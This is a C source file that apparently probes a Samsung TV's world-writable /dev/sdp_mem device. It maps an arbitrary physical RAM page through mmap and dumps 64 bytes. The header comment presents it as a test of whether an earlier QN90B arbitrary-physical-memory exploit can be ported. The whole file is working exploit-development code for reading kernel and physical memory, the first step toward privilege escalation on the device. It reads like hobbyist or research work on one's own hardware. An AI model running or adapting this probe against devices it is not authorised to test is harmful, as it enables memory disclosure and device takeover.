/* sdp-mem-probe.c — test /dev/sdp_mem mmap semantics on NikeM2.
 *
 * The QN90B exploit used /dev/sdp_pqe_fdet: mmap with vm_pgoff = physical PFN,
 * no validation -> arbitrary physical RAM mapping. /dev/sdp_mem is the
 * world-rw sibling on our TV. This probe tries to map one physical page at
 * 0x20000000 (RAM base per cmdline/iomem) READ-ONLY and dump 64 bytes.
 *
 * If it prints recognizable kernel/RAM bytes instead of an error,
 * we have physical-memory read -> port of the fdet exploit is viable.
 *
 * Build: zig cc -target arm-linux-musleabi -static -O2 -o sdp-mem-probe sdp-mem-probe.c
 * Run:   ./sdp-mem-probe [pfn_hex]   (default 0x20000 -> phys 0x20000000)
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

int main(int argc, char **argv)
{
    unsigned long pfn = 0x20000; /* 0x20000000 >> 12 */
    if (argc > 1) pfn = strtoul(argv[1], 0, 0);

    int fd = open("/dev/sdp_mem", O_RDWR);
    if (fd < 0) { perror("open /dev/sdp_mem"); return 1; }

    /* armv7l mmap2: last arg is pgoff (pages), so pfn maps phys pfn<<12 */
    void *p = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, pfn);
    if (p == MAP_FAILED) { perror("mmap ram page"); close(fd); return 2; }

    unsigned char *b = p;
    printf("mapped ok. first 64 bytes @ phys 0x%08lx:\n", pfn << 12);
    for (int i = 0; i < 64; i += 16)
        printf("  %02x %02x %02x %02x %02x %02x %02x %02x  %02x %02x %02x %02x %02x %02x %02x %02x  %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",
               b[i],b[i+1],b[i+2],b[i+3],b[i+4],b[i+5],b[i+6],b[i+7],
               b[i+8],b[i+9],b[i+10],b[i+11],b[i+12],b[i+13],b[i+14],b[i+15],
               b[i]>31&&b[i]<127?b[i]:46, b[i+1]>31&&b[i+1]<127?b[i+1]:46,
               b[i+2]>31&&b[i+2]<127?b[i+2]:46, b[i+3]>31&&b[i+3]<127?b[i+3]:46,
               b[i+4]>31&&b[i+4]<127?b[i+4]:46, b[i+5]>31&&b[i+5]<127?b[i+5]:46,
               b[i+6]>31&&b[i+6]<127?b[i+6]:46, b[i+7]>31&&b[i+7]<127?b[i+7]:46,
               b[i+8]>31&&b[i+8]<127?b[i+8]:46, b[i+9]>31&&b[i+9]<127?b[i+9]:46,
               b[i+10]>31&&b[i+10]<127?b[i+10]:46, b[i+11]>31&&b[i+11]<127?b[i+11]:46,
               b[i+12]>31&&b[i+12]<127?b[i+12]:46, b[i+13]>31&&b[i+13]<127?b[i+13]:46,
               b[i+14]>31&&b[i+14]<127?b[i+14]:46, b[i+15]>31&&b[i+15]<127?b[i+15]:46);
    munmap(p, 4096);
    close(fd);
    return 0;
}
